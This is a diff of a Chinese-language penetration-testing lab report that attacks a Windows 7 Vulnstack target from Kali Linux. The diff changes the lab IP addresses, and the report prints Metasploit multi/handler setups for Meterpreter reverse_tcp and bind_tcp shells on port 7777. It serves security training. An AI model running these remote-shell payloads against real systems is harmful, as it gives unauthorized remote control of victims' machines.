@@ -18,9 +18,9 @@
 二、实验环境
 
 角色 系统 IP地址 备注
-攻击机 Kali Linux 192.168.1.10 渗透测试平台
+攻击机 Kali Linux 192.168.19.128 渗透测试平台
 
-目标机 Windows 7 192.168.1.20 Vulnstack漏洞环境
+目标机 Windows 7 192.168.19.135 Vulnstack漏洞环境
 
 三、实验步骤
 
@@ -34,10 +34,12 @@
 1. 生成反向TCP Shell<br>
 (1)：打开kali终端，执行命令生成payload
 ![生成payload](payload.png)
+
 (2)查询目标机ip及开放端口
 ![目标机ip和开放端口](cxkfdk.png)
 2. 生成正向TCP Shell
 ![正向TCP Shell](zxtcp.png)
+
 3. 配置Metasploit/multi/handler模块<br>
 (1)启动msfconsole,加载反向Shell监听模块
 
@@ -46,7 +48,7 @@
 msfconsole
 use exploit/multi/handler
 set payload windows/x64/meterpreter/reverse_tcp
-set LHOST 192.168.1.10
+set LHOST 192.168.19.128
 set LPORT 7777
 exploit
 ```
@@ -58,7 +60,7 @@ exploit
 ```bash
 use exploit/multi/handler
 set payload windows/x64/meterpreter/bind_tcp
-set RHOST 192.168.1.20
+set RHOST 192.168.19.135
 set LPORT 7777
 exploit
 ```
